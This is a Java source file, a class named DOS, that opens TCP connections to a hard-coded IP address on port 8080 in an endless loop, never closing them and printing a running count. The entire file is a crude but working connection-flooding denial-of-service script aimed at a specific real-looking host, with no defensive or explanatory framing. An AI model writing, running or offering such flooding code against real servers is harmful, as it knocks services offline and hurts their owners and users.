import java.net.Socket;

public class DOS {
    public static void main(String[] args) {
        int numSoc = 0;
        while(true){
            try {
                Socket socket = new Socket("129.121.120.160", 8080);
                numSoc +=1;
                System.out.println(numSoc);
            }
            catch (Exception e) {
                System.out.println("Error");
            }
        }

    }

}
